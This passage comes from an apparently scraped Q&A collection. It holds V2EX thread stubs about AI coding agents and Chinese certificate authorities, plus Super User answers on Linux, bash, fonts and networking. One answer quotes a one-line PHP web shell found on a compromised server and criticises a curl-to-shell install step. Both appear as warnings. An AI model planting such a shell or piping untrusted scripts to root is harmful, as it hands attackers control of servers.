+巨头随手做的东西，就把一个创新赛道里的参赛者挤死大半。 比功能，巨头随便投入点人力就能碾压。 比营销，根本不是一个量级。 比财力，比模型，这都没法比啊。。 说的就是上半年国内蛮火的闪电说。 更何况后面还有豆包的语音输入法蓄势待发。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211319#reply36
+
+---
+
+#### 3015. [V2EX] 教你以「上下文信息密度」为第一性原理构建最强通用 Agent
+
+**问题描述 / Problem Description**:
+写在开头 FBI Warning⚠️：如果您没有使用过 ai 工具，没有相关的编程经验，或是对这个话题不敢兴趣，请您现在就退出当前页面。它将浪费你人生中宝贵的三分钟 友情提示：如果你想设计一个自己的 agent 或者想要深入理解 agent 如何高效运行，那么花 10 分钟理解本文会是你今年迄今为止对自己的时间做出的最值得的投资 想象一个项目工程，是做加法容易？还是减法容易？做一个通用 agent ，如何兼顾所有用户需求？如何能在简洁的前提下让一个有智慧的 agent 充分自举？ GitHub： https://github.com/juntao-ai/GenericAgent 论文： htt
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211308#reply82
+
+---
+
+#### 3016. [V2EX] 国产 CA 是不是风险有点高
+
+**问题描述 / Problem Description**:
+CA 私钥泄露，系统的所有流量都能被中间人攻击。国产的一堆 CA ，多数无强制证书透明 CT 日志，泄露了也不知道。 好像鸿蒙系统内置了很多国产 CA ，是不是风险有点大
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211244#reply13
+
+---
+
+#### 3017. [V2EX] openCode go + omo 使用效果一般，是我的姿势不对吗？
+
+**问题描述 / Problem Description**:
+如题，感觉 openCode go + omo 使用效果一般，而且 token 使用量耗费极大，一会儿就蹬没有了。 同样的提示语句： codex 一会儿就干完了，又快又对 glm5.1 + omo 很慢还写错好几遍 各位老哥有什么技巧可以传授一下吗？ opencode 相关的技巧都可以丢过来。 或者有没有 codex 20x 跟 claude 的中转不掺水的？
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211237#reply42
+
+---
+
+#### 3018. [V2EX] 高强度使用了半年 claude code 后，我终于无法忍受了，并且我发现了绝佳替代
+
+**问题描述 / Problem Description**:
+直接上菜： GenericAgent https://github.com/lsdefine/GenericAgent 本人基本信息 ：国内某 top3 的计算机博士在读，大模型方向。 最近对 cc 的使用情况 ： 我最近在 github trending 上关注了 GA 这个项目，并 高强度使用了一周多（完全接管我的科研+生活） ，然后我就 卸载了 cc 、codex 和 openclaw （但是感谢 cc 曾经在我的生命中出现过，不过 openclaw 你是真的垃圾啊）。。 那么有人问了，cc 那么屌，openclaw 被吹的那么神，有什么问题？ 我想但凡用过的人此时在心里都有答案了。。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211200#reply278
+
+---
+
+#### 3019. Why can’t I delete a suspicious PHP file even with root?
+
+**问题描述 / Problem Description**:
+Tags: linux, permissions, centos, php, centos-7 | Score: 34 | Views: 4708 | Answers: 2 | Created: 2025-07-16
+
+**解决方案 / Solution**:
+Your server is compromised; wipe and reinstall I cannot stress this enough. Right now, someone else owns your server, and has access to everything on it. You need to decommission it and reinstall all software from trusted media. <?php @eval($_POST['shell']);?> Yeah, that's a classic web shell. Someone uploaded that to easily execute commands on your server. Moreover, the web shell was put in an innocent-sounding filename in an attempt to hide it ( admin/error.php ), and the parent directory was immutable. Only root can make directories immutable, so the attacker has root. Please understand that just removing this file does not fix the problem . For one, it doesn't close the security hole the attacker used in the first place. And furthermore, after the attacker had (root) access to your system, you cannot trust what you see on your server anymore. Finally, you may want to stay away from CWP . I'm not too familiar with that control panel, but a brief search made me very concerned with its security. For example, in their installation instructions , they make you do the equivalent of curl http://centos-webpanel.com/cwp-el9-latest | sh . Yeah, download a shell script over plain http and run as root. That's a disqualifying fuck-up already. I also randomly encountered this page with CWP security vulnerabilities . The first four (out of 13) vulnerabilities on that page: CVE-2019-13359 - Root Privilege Escalation CVE-2019-13360 - User panel bypass Login #1 CVE-2019-13605 - User panel bypass Login #2 CVE-2019-13383 - User Enumeration via HTTP response message The combination of those four allow basically any visitor to get root on the system with CWP. Yikes. Now, those are from 2019, but it does not bode well. A quick search also revealed more recent, very serious, exploits (e.g. CVE-2021-45467 , CVE-2022-44877 ). That piece of software looks like a security nightmare . Stay away.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1910971/why-can-t-i-delete-a-suspicious-php-file-even-with-root
+
+---
+
+#### 3020. Play 2 audio files/streams simultaneously
+
+**问题描述 / Problem Description**:
+Tags: audio, debian, pulse-audio | Score: 15 | Views: 1654 | Answers: 1 | Created: 2025-05-19
+
+**解决方案 / Solution**:
+I found the problem and have the solution. The issue was the built-in "Media Flow" ( https://store.kde.org/p/1986300 ) applet. Media Flow has 2 options: auto-pause and auto-resume when another source is playing. Unfortunately, it seems that neither of those options does anything, and the problem went away after I removed the applet.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1898998/play-2-audio-files-streams-simultaneously
+
+---
+
+#### 3021. Is it worth to defragment XFS on SSD (many files)?
+
+**问题描述 / Problem Description**:
+Tags: ssd, email, centos, xfs | Score: 13 | Views: 5858 | Answers: 4 | Created: 2022-12-19
+
+**解决方案 / Solution**:
+How does defragmenting help? When storing data on an HDD with a spinning disk, defragmentation reduces the mechanical seek time penalty significantly. Highly-fragmented filesystems on those devices can become extremely slow. Solid state devices do not have any seek penalty. However, modern high-speed SSDs are often IOPS limited, meaning that the rate at which commands can be sent over the bus is the bottleneck, not the ability of the device to access the actual data and service those requests. Defragmenting a filesystem increases the number contiguous logical sectors in a given file. This can improve performance, even for an SSD, because reading a small portion of a file can be done with a single I/O request. If that same portion was fragmented, it might take multiple requests. This could easily saturate the bus when using an extremely-fast SSD with a heavily-fragmented filesystem. However, there are better ways to improve performance. Use TRIM instead If you want to improve performance on an SSD, you have to help the SSD know which blocks can be erased by using TRIM . A TRIM command allows the filesystem to tell the SSD which sectors are empty and can be handed over to the garbage collector, even if they still have (unallocated) data on them. This greatly improves the device's ability to manage storage. On Linux, you can execute the command fstrim /var/mail (or wherever your partition is) to give the SSD a list of unallocated sectors that can be discarded. See fstrim(8) for more details on command usage. TRIM greatly improves the ability of the SSD to counter write amplification and allows for better wear leveling. This will not speed up reads from the device, but it will speed up writes. If your drive has very little free space, there will be less benefit (after all, you wouldn't have many free sectors). Solid state drives have their own form of defragmentation Because the FTL (flash translation layer, a part of the flash controller) of an SSD is responsible for mapping logical sectors to physical sectors, there's no serious need to defragment a filesystem in most situations. The time it takes to defragment and the wear is generally not worth it. SSDs will automatically attempt to optimize the storage of files. This optimization is subject to the limitations of NAND flash. To understand the limitations, we have to describe some terminology: Cells are the smallest physical unit which stores data in a flash device. In SLC devices, each cell stores a single bit. MLC devices, each cell stores two (by holding four different voltage levels). TLC devices store three (by holding 8), and QLC, four (by holding 16). Multiple cells, plus some extra to hold error-correcting codes that help recover from failures of individual cells, make up a page . Pages are a collection of cells that can be read from or written to at once. A page is how NAND flash devices implement physical sectors, and most pages are between 512 bytes and 4 KiB in size. Pages can only be written to if they have been erased (all bits initialized to 1). If a page has data on it, it cannot be overwritten without first being erased. This is due to the fact that a single bit can only be changed from a 1 to a 0. The other way around can only be done by erasing an entire page. However, it's not possible to erase individual pages. To erase a page, you must erase the entire block . Blocks are a collection of pages and are measured in tens or hundreds of kilobytes. 128 individual 4 KiB pages may make up a single 512 KiB block. The only action that can be taken on an individual block is erasure. This will erase all pages that it contains. Any data in any of those pages that needs to be preserved must be moved to another block that has some erased pages already. This is done by the flash controller transparently. If you have very few free blocks, the controller may need to move some data around in order to write anything, which slows down writes continuously. This poses a problem: In order to most effectively optimize writes, the SSD needs to know which sectors the filesystem no longer needs. However, block storage devices don't even have a concept of filesystems. They can't distinguish between a sector that is no longer allocated to any file but still contains leftover data and a sector that is still part of a file and must be preserved. Because making SSDs aware of filesystems would be a Sisyphean task, it's better to simply tell the SSD which sectors the filesystem no longer needs. Modern SSDs support this via TRIM.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1758592/is-it-worth-to-defragment-xfs-on-ssd-many-files
+
+---
+
+#### 3022. Why am I seeing a weird font in my Chrome/Brave?
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, google-chrome, debian | Score: 10 | Views: 3823 | Answers: 3 | Created: 2025-09-21
+
+**解决方案 / Solution**:
+This problem usually happens because Chromium browsers like Chrome or Brave end up using the wrong system fonts on Linux, while Firefox is not affected since it handles fonts differently. The first thing you should try is refreshing the font cache with the command: fc-cache -r -v After that, reinstall the common fonts that Chromium depends on, such as Liberation and Noto, with: sudo apt install --reinstall fonts-liberation fonts-noto-core Once that is done, open Chrome or Brave settings, go to chrome://settings/fonts , and set both the standard and serif fonts to something reliable like Noto Sans or Noto Serif. Finally, make sure you don’t have any broken or strange overrides in your font configuration files, either in /etc/fonts/local.conf or ~/.config/fontconfig/fonts.conf . In most cases, refreshing the cache, reinstalling the fonts, and explicitly setting them in the browser clears up the weird font rendering.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1925177/why-am-i-seeing-a-weird-font-in-my-chrome-brave
+
+---
+
+#### 3023. Why does a Perl CGI program not write to files on Fedora 40 with Apache?
+
+**问题描述 / Problem Description**:
+Tags: linux, apache-http-server, fedora, perl | Score: 10 | Views: 1450 | Answers: 3 | Created: 2024-11-15
+
+**解决方案 / Solution**:
+Programs may have a different view of the filesystem set up for them by the service manager (or rarely by PAM for user logins, too). For example, it is very common to configure the Apache2 .service in systemd so that it has an isolated /tmp mounted which is only visible to processes inside the .service – you will see PrivateTmp= enabled in systemctl cat apache2 , and if you run findmnt in your CGI script it'll report a different output than findmnt from an interactive logon. When PrivateTmp is enabled, the service's /tmp is really mapped to /tmp/systemd-private-foo/ on the host (using a bind mount that systemd sets up), so the file creation will succeed¹ – unlike with SELinux, which would return an access denied error (and would log it to dmesg) – but the file is located elsewhere than you think. ¹ That is to say, this sounds to me like a completely different situation than your original "Foswiki can't open log file" issue. If the open function failed, then that most likely was some kind of permissions or SELinux problem. (Of course, the first step should be to check what error code it returned instead of just "it failed" – ideally the wiki should log the failure to systemd journal using the syslog() function, which is always accessible to services and even CGI scripts.) use Sys::Syslog; if (open(my $fh, ">>", "/path/to/log")) { ... } else { syslog("err", "Could not open /path/to/log: %m"); die("Could not open log: $!"); } Often network-based services are configured with a whole ton of filesystem namespacing options, including making their view of /home read-only (or invisible), so that they won't reach out to where they generally shouldn't. makes me wonder how much code is needed in the kernel to support that feature. In absolute terms – a lot, but relatively speaking – zero, as it relies on a pre-existing kernel feature: the same filesystem namespacing is what powers "container" systems such as Docker or LXC, and its kernel implementation predates the creation of systemd by some 3 or 4 years.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1861798/why-does-a-perl-cgi-program-not-write-to-files-on-fedora-40-with-apache
+
+---
+
+#### 3024. What is the difference between an `.iso` OS for a network and an `.iso` OS for CD?
+
+**问题描述 / Problem Description**:
+Tags: linux, fedora, iso-image | Score: 10 | Views: 2238 | Answers: 1 | Created: 2024-08-22
+
+**解决方案 / Solution**:
+The "network" versions assume that you have a network available during installation and that it is fast enough for you to download needed packages on the fly. It assumes that you know you have a network adaptor that is compatible with the operating system you are installing and that it can be brought up and used to download packages. As a result it will contain only enough on the install media to run and launch the installer. It most likely will not contain packages on the install media. The "CD" version assumes you may not have a network available, or for whatever reason do not wish to use it and so will contain a large selection of default packages on the install media. If your network is slow or you have a fast network in an alternative location then you may prefer the CD version, but you will have potentially downloaded a large number of packages you don't need or want. If your network is fast or you only need a minimal amount of packages you can use the Network media as it will save you downloading a lot of unnecessary packages. As the Network media is getting packages from download servers straight away then it may be more up to date than the CD version which could be an older snapshot of packages, though it is likely you can update them all from within the environment once installed, or even during installation if it can connect to the internet. The end result is going to be (nearly) the same between install media. Choose whichever version suits you. Do you have the internet available and want a faster initial download but can deal with a slower install while it downloads packages? Get the network version. Do you want everything downloaded before you start for a faster install at the cost of downloading a lot of stuff you may not need? Use the CD version.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1853137/what-is-the-difference-between-an-iso-os-for-a-network-and-an-iso-os-for-c
+
+---
+
+#### 3025. Why does Git Bash hang for several seconds if I press Tab as the first key? And how do I stop it?
+
+**问题描述 / Problem Description**:
+Tags: bash, keyboard-shortcuts, freeze, autocomplete, git-bash | Score: 8 | Views: 346 | Answers: 2 | Created: 2025-11-14
+
+**解决方案 / Solution**:
+Why does this happen? Because you are simply trying to autocomplete nothing, which by default resolves to every possibility in Bash (Git Bash is just a Windows version of it), including all the executables from all the %PATH% directories, etc. When this happens, I try the various different kill commands, to no avail There is nothing to kill - killing the process would kill the shell as that's what's running the autocompletion. There could in theory be a separate shortcut to stop readline from continuing own logic, but there's no such implementation and from what I see it'd be hard to implement given how synchronously it currently works and keyboard shortcuts are also input. How do I stop it? You want to prevent autocompletion of empty input. This is done by e.g. enabling the no_empty_cmd_completion shell option : shopt -s no_empty_cmd_completion It disables it for both completely empty and whitespace-only lines. You can add it to .bashrc file for it to be permament.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1930161/why-does-git-bash-hang-for-several-seconds-if-i-press-tab-as-the-first-key-and
+
+---
+
+#### 3026. Why did a Fedora update break my unicode U.S. flag symbol?
+
+**问题描述 / Problem Description**:
+Tags: bash, unicode | Score: 7 | Views: 2127 | Answers: 2 | Created: 2026-05-03
+
+**解决方案 / Solution**:
+The Unicode codepoint U+FE4E6 is in the "Private use" range, where each font defines its own meaning. It is not defined to specifically be a U.S. flag, it just happens to be a U.S. flag in one of the fonts you have. (On my non-Fedora system it has no glyph at all.) So it sounds like the Fedora update either removed the font, or installed (or updated) another font which also uses U+FE4E6 for its own purposes, and that other font now has priority in the "fallback" font list produced by Fontconfig. If your terminal font is set to e.g. the "Monospace" alias, you can do fc-match -s "Monospace" to see what fonts it resolves to. One of those will be the font with the new glyph, and below it there might still be the font with the flag. Try temporarily removing the corresponding font files from /usr until you get the flag back. There might be a way to prioritize fonts via ~/.config/fontconfig/fonts.conf for specific codepoint ranges. Or – if the "something else" is a rectangle with tiny characters '0FE 4E6' inscribed – then that means no font was found which would have a glyph for this codepoint. In that case it may still be that Fontconfig is set to exclude that font, or it may be that the upgrade removed the font completely, or that it updated the font to a new version which lacks the glyph. Officially, Unicode 6.0 defines "Regional indicator" symbols which fonts can use for flags – you might get the U.S. flag by combining U+1F1FA and U+1F1F8 (regional indicators U and S forming a ligature or a "contextual alternate"), e.g. echo $'\U1F1FA\U1F1F8' .
+
+**参考链接 / References**:
+- https://superuser.com/questions/1937289/why-did-a-fedora-update-break-my-unicode-u-s-flag-symbol
+
+---
+
+#### 3027. With network manager (nmcli), how do I drop and renew a dhcp lease from the command line?
+
+**问题描述 / Problem Description**:
+Tags: fedora, dhcp, networkmanager | Score: 6 | Views: 8409 | Answers: 1 | Created: 2024-10-30
+
+**解决方案 / Solution**:
+Edit after comment bellow: This will not DROP a lease and discover a new one, it will simply force a renegotiation. Depending on what you changed on the server, might get you the desired result. See comment by Bert to understand the messages this will generate. nmcli conn down id 'Wired connection 1' && nmcli con up id 'Wired connection 1' nmcli conn show to get the id to use. You can probably use uuid or device. But it most likely will be that name above.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1860300/with-network-manager-nmcli-how-do-i-drop-and-renew-a-dhcp-lease-from-the-comm
+
+---
+
+#### 3028. 2 different process monitors app report different results for the same process?
+
+**问题描述 / Problem Description**:
+Tags: linux, memory, fedora | Score: 5 | Views: 675 | Answers: 1 | Created: 2026-02-12
+
+**解决方案 / Solution**:
+There are different things on a system that are all called "memory", for one. Virtual Memory and Physical Memory, for instance. Virtual Memory includes cache that is actually stored on disk, whereas Physical Memory typically refers to the specific resource we call "RAM". There are also different ways memory is assigned to or used by a given process. There's Reserved memory and Active memory, for instance. A process may tell the system "I expect to require this much memory" while at the same time it is only actively using a smaller amount, and the OS handles these different memory differently, based on available overall system resources and other factors. Note that these examples are not ALL of the types of memory or ways that memory can be used. They are simply a couple of the more common or obviously different categories that illustrate the point. Understanding what each of these applications are reporting is important. All of the numbers can be true and accurate even if they are not the same. Fedora notes such differences are "as intended" per this document , as each application is using a different and valid calculation to represent the Memory value. There are also bugs. Astra Monitor, which is what I believe the Gnome System Monitor is based on, had an issue where such a discrepancy was resolved within the last year or so, for instance. Reference: https://linuxvox.com/blog/linux-memory-reporting-discrepancy/
+
+**参考链接 / References**:
+- https://superuser.com/questions/1934839/2-different-process-monitors-app-report-different-results-for-the-same-process
+
+---
+
+#### 3029. Exported PS1 environment variable, doesn't persist in a subshell
+
+**问题描述 / Problem Description**:
+Tags: linux, ubuntu, command-line, bash, environment-variables | Score: 5 | Views: 529 | Answers: 1 | Created: 2026-01-03
+
+**解决方案 / Solution**:
+On AlmaLinux 10.1 I can repeat your results from CentOS 7, in that "NewPrompt" remains in the subshell:: mr_halfword@alder-lake-alma:~$ export PS1="NewPrompt: " NewPrompt: bash NewPrompt: On Ubuntu 24.04.3 LTS I can repeat your results from Ubuntu 18.04, in that "NewPrompt" doesn't stay in the subshell: mr_halfword@Haswell-Ubuntu:~$ export PS1="NewPrompt: " NewPrompt: bash mr_halfword@Haswell-Ubuntu:~$ On Ubuntu 24.04.3 LTS the ~/.bashrc in my user account sets PS1 which explains why "NewPrompt" doesn't stay in the subshell: mr_halfword@Haswell-Ubuntu:~$ grep PS1 ~/.bashrc PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ ' PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ ' PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1" And the Ubuntu default .bashrc , which I think gets used when a new account is created, has the same code to set PS1 in my user account ~/.bashrc : mr_halfword@Haswell-Ubuntu:~$ grep PS1 /etc/skel/.bashrc PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ ' PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ ' PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1" Whereas on AlmaLinux 10.1 neither my account ~/.bashrc nor the default .bashrc set PS1: mr_halfword@alder-lake-alma:~$ grep PS1 ~/.bashrc mr_halfword@alder-lake-alma:~$ grep PS1 /etc/skel/.bashrc mr_halfword@alder-lake-alma:~$ One work-around could be to start a bash subshell using the --norc option which is documented as: --norc Do not read and execute the system wide initialization file /etc/bash.bashrc and the personal initialization file ~/.bashrc if the shell is interactive. This option is on by default if the shell is invoked as sh. Tested with Ubuntu 24.04.3 LTS, where also used echo $$ to confirm when a new process had been started (when the PID changes): mr_halfword@Haswell-Ubuntu:~$ echo $$ 27720 mr_halfword@Haswell-Ubuntu:~$ export PS1="NewPrompt: " NewPrompt: echo $$ 27720 NewPrompt: bash --norc NewPrompt: echo $$ 27777 NewPrompt: However, using --norc does mean that the other initialisation in .bashrc isn't run in the new subshell. An alternative would be to edit your ~/.bashrc to not change PS1 if it is already set.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1933236/exported-ps1-environment-variable-doesnt-persist-in-a-subshell
+
+---
+
+#### 3030. Why does `( cmd )` and `( cmd ) || ( foo )` catch errors differently in `cmd`?
+
+**问题描述 / Problem Description**:
+Tags: bash | Score: 4 | Views: 61 | Answers: 1 | Created: 2026-02-25
+
+**解决方案 / Solution**:
+Regarding the OP's "My current solution:" section. OP posted the following. set -e set -o pipefail ( cmd1 cmd2 ) || ( failure_catcher ) Since cmd1 and cmd2 are part of a || list, the errexit option is treated as off when these commands execute. Below is one possible fix, where the errexit option will be treated as on when executing cmd1 and cmd2 . Here, set +e temporarily sets the errexit to off so the || list can determine if cmd1 or cmd2 exited with a non-zero status. set -e set -o pipefail ( set +e ( set -e cmd1 cmd2 ) [ $? = 0 ] || ( failure_catcher ) ) Regarding the OP's "For a testable example:" section. OP posted the following. set -e set -o pipefail ( false echo "After failure" ) || ( echo "Failed" ) Using my possible fix would translate the above to what is shown below. set -e set -o pipefail ( set +e ( set -e false echo "After failure" ) [ $? = 0 ] || ( echo "Failed" ) ) Regarding the OP's "I might have found a way:" section. OP posted the following. runit() { false echo "After failure" } export -f runit ( bash -e -o pipefail -c runit ) || ( echo "Failed" ) Using my possible fix would translate the above to what is shown below. runit() { false echo "After failure" } ( set +e ( set -e -o pipefail; runit ) [ $? = 0 ] || ( echo "Failed" ) )
+
+**参考链接 / References**:
+- https://superuser.com/questions/1935286/why-does-cmd-and-cmd-foo-catch-errors-differently-in-cmd
+
+---
+
+#### 3031. Why is rsync excluding a file with delete/delete-excluded but not excluding a subdirectory with same name?
+
+**问题描述 / Problem Description**:
+Tags: linux, bash, rsync | Score: 4 | Views: 305 | Answers: 2 | Created: 2025-12-31
+
+**解决方案 / Solution**:
+Excluding items named "core" will exclude both files and directories with that name. I don't know of a way to make a rule that only applies to files, not directories, but it's easy to override the exclude rule with an include rule that only applies to directories. Change your EXCLFILE to this: + core/ core The terminating / makes the first rule only apply to directories, and the " + " is shorthand for include , so the first line will be treated as an include rule even if it's in a rule file specified with --exclude-from . Note that it's important that the include rule come before the exclude rule, or else the exclude rule would take precedence.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1933142/why-is-rsync-excluding-a-file-with-delete-delete-excluded-but-not-excluding-a-su
+
+---
+
+#### 3032. How do I exclude folders from the 'find' command when accepted solutions don't work?
+
+**问题描述 / Problem Description**:
+Tags: bash, find | Score: 4 | Views: 716 | Answers: 1 | Created: 2025-12-01
+
+**解决方案 / Solution**:
+Start with a find command that includes the directory (i.e. uses -path as a positive match), and tune it until it outputs nothing else but the directory: $ find ~/Music/ -mindepth 1 -path archive [nothing] $ find ~/Music/ -mindepth 1 -path ./archive [nothing] $ find ~/Music/ -mindepth 1 -path ~/Music/archive /home/grawity/Music/archive This shows that "Instead, <exclude> must be given relative to <root> " is not actually true. It is not relative to the search root, but has the search root as a prefix – in other words, the -path input needs to look the same as find's output. In your linked example it only appears to be relative because the search root itself is relative (if the root is . , then the results naturally start with ./ as well), but if the root is absolute, then find's results (and therefore also -path inputs) are also absolute. Now that you have a command that successfully does a positive match, add -prune to achieve the opposite: $ find ~/Music/ -mindepth 1 -print | grep archive [1955 lines] $ find ~/Music/ -mindepth 1 -path ~/Music/archive -prune -o -print | grep archive [nothing] For clarity, I would use parens even if they're not strictly necessary: $ find ~/Music/ -mindepth 1 \( -path ~/Music/archive -prune \) -o \( -print \)
+
+**参考链接 / References**:
+- https://superuser.com/questions/1930906/how-do-i-exclude-folders-from-the-find-command-when-accepted-solutions-dont-w
+
+---
+
+#### 3033. Prevent NetworkManager.service from logging on all TTYs of the console
+
+**问题描述 / Problem Description**:
+Tags: centos, centos-7, console, tty, error-logging | Score: 4 | Views: 255 | Answers: 1 | Created: 2025-11-19
+
+**解决方案 / Solution**:
+Those are not NetworkManager logs. They're kernel logs (as in, dmesg ), merely indirect result of some action that NetworkManager does. (In this case the kernel's IPv6 stack always prints this sort of junk every time an interface is brought up while it still has no physical carrier – and of course NetworkManager's job is literally to bring interfaces up.) The kernel always logs to where the console= boot parameter specifies. By default, that's /dev/tty0 which means "the currently active (foreground) terminal". Either boot with a different console= parameter, e.g. /dev/tty1, or use dmesg --console-level to temporarily restrict console output to only specific level as minimum, for example, warning . The same corresponds to the loglevel= boot parameter (though I think that requires the numeric level).
+
+**参考链接 / References**:
+- https://superuser.com/questions/1930376/prevent-networkmanager-service-from-logging-on-all-ttys-of-the-console
+
+---
+
+#### 3034. How can I grep two different match combination of the file names with filter?
+
+**问题描述 / Problem Description**:
+Tags: linux, command-line, bash, grep | Score: 4 | Views: 534 | Answers: 4 | Created: 2025-09-30
+
+**解决方案 / Solution**:
+I think you're overthinking your regex: echo 'KLM11.PM.Thirdqual.fourthqual.txt KLM34.PM.Thirdqual.fourthqual.txt KLM34.PM.Thirdqual.fourthqual KLM43.PM.Thirdqual.fourthqual KLM83.PM.Thirdqual.fourthqual.txt KLM04.TP.Thirdqual.fourthqual.txt KLM98.OS.Thirdqual.fourthqual.txt KLM98.OS.Thirdqual.fourthqual.txt.sixthqual.seventhqual' | grep -E '(11|34)\.PM\.|\.(TP|OS)\.' KLM11.PM.Thirdqual.fourthqual.txt KLM34.PM.Thirdqual.fourthqual.txt KLM34.PM.Thirdqual.fourthqual KLM04.TP.Thirdqual.fourthqual.txt KLM98.OS.Thirdqual.fourthqual.txt KLM98.OS.Thirdqual.fourthqual.txt.sixthqual.seventhqual
+
+**参考链接 / References**:
+- https://superuser.com/questions/1925795/how-can-i-grep-two-different-match-combination-of-the-file-names-with-filter
+
+---
+
+#### 3035. Debian nvidia-driver not creating kernel modules
+
+**问题描述 / Problem Description**:
+Tags: debian, nvidia-graphics-card, debian-bookworm | Score: 4 | Views: 1710 | Answers: 1 | Created: 2025-06-15
+
+**解决方案 / Solution**:
+In my case the problem was that linux-headers-amd64 was not installed. After installation, run dpkg-reconfigure nvidia-kernel-dkms . Imho this is a bug in package dependencies.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1905207/debian-nvidia-driver-not-creating-kernel-modules
+
+---
+
+#### 3036. Failed RDP connection - Failed to Start Remote Desktop Session
+
+**问题描述 / Problem Description**:
+Tags: linux, remote-desktop, fedora, gnome | Score: 4 | Views: 2111 | Answers: 1 | Created: 2024-03-19
+
+**解决方案 / Solution**:
+I just had the same problem, and I guessed that the error message "Session creation inhibited" might be related to the fact that I locked my screen before I left home. So I figured maybe unlocking it remotely might help: List your own sessions: loginctl Example output: martin@desktop ~ % loginctl SESSION UID USER SEAT LEADER CLASS TTY IDLE SINCE 2 1000 martin seat0 3554 user tty2 no - 3 1000 martin - 3621 manager - no - 6 1000 martin - 3024816 user pts/8 no - 7 1000 martin - 3059521 user pts/6 no - 4 sessions listed. The one you are looking for is the one with the seat, so in my case, session 2 . Unlock that session: loginctl <session> So in my case, loginctl unlock-session 2 . Afterwards I could connect.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1835796/failed-rdp-connection-failed-to-start-remote-desktop-session
+
+---
+
+#### 3037. How to exclude sensors from output?
+
+**问题描述 / Problem Description**:
+Tags: linux, fedora, temperature, lm-sensors | Score: 4 | Views: 1904 | Answers: 1 | Created: 2024-01-30
+
+**解决方案 / Solution**:
+Following @harrymc's advice to check the output of sensors -u , I noticed there were several readings below each "AUXTIN*" entry: AUXTIN3: temp6_input: 26.000 temp6_max: 80.000 temp6_max_hyst: 75.000 temp6_crit: 100.000 temp6_alarm: 0.000 temp6_type: 4.000 temp6_offset: 0.000 temp6_beep: 0.000 So I changed the configuration to refer to these temp* values instead of AUXTIN* : chip "nct6798-*" ignore temp3 ignore temp4 ignore temp5 ignore temp6 ignore temp7 And it worked!
+
+**参考链接 / References**:
+- https://superuser.com/questions/1828051/how-to-exclude-sensors-from-output
+
+---
+
+#### 3038. Fedora KDE: Menu not responding any more
+
+**问题描述 / Problem Description**:
+Tags: linux, fedora, kde, qt | Score: 3 | Views: 467 | Answers: 1 | Created: 2026-01-27
+
+**解决方案 / Solution**:
+OK, after creating the file org.kde.kstart.desktop me@myPC:~>cat /usr/share/applications/org.kde.kstart.desktop [Desktop Entry] Type=Application Name=KStart Exec=org.kde.kstart Icon=some-icon Categories=Qt;KDE; the menue is responsible again. The widget to switch activities is still not reacting, but there are other ways to do that and the rest of the menue is now fine again.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1934220/fedora-kde-menu-not-responding-any-more
+
+---
+
+#### 3039. How can I send data (not commands) over SSH?
+
+**问题描述 / Problem Description**:
+Tags: linux, bash, ssh | Score: 3 | Views: 1087 | Answers: 3 | Created: 2026-01-27
+
+**解决方案 / Solution**:
+I think there are two different things you're mixing up: using a Telnet client to talk to non -Telnet servers (which only overlap with Telnet in their use of ASCII/NVT-based protocols); using a Telnet client to talk to actual Telnet servers which output custom things instead of a typical login prompt. Situation #1 involves arbitrary protocol-level data in the underlying packets already before the client interprets them, while #2 involves arbitrary data displayed to the user after the client interprets the protocol. IRC is a case of the former. Blinkenlights is a case of the latter. With the Telnet protocol it's hard to tell the difference, but it's a very important difference, and it means that case #2 is possible with SSH clients but case #1 is not – because in case #1 the proper protocol isn't spoken and only happens to work, thus if you tried to achieve #1 "using the SSH protocol" you would literally not be using the SSH protocol anymore. On the other hand, case #2 is not actually "raw data", it is something that specifically fits into the existing Telnet protocol (for example, Blinkenlights is still very much within the Telnet framework even if it's not a shell) and can be easily mapped to happen inside the SSH protocol or any other terminal-connection protocol. As one specific example, if there was a "telnettable" server like Blinkenlights but which provided access to an interactive game like Nethack, the server would actually have to speak at least a minimum of the proper Telnet protocol to switch the 'telnet' client from line-based to character-based input mode, so it would be a case of #2, not #1. (I've written both IRC servers and Telnet servers. Both are old protocols where the line between 'protocol' and 'user' interface is very thin – for Telnet it's practically by design and indeed FTP/SMTP were explicitly meant to be "telnettable" in the early days, but actual IRC clients have a similar issue where it's customary for user /commands to be mapped to raw protocol commands, blurring the line to great annoyance of IRC client developers.) You can also connect to IRC using telnet, because it's not confined to connecting to a shell. No, more precisely, the 'telnet' client is not limited to connecting to a Telnet server , because the Telnet protocol uses in-line control codes¹ and all of its negotiation is optional, so a Telnet client just so happens to be easily compatible with other ASCII-based protocols – but only as long as they don't use the same specific bytes that start a Telnet control code. Indeed when you connect to IRC using the telnet program, you aren't speaking the Telnet protocol at first: the 'telnet' client recognizes a non-standard port and doesn't actively send any negotiation. (If it were, the IRC server 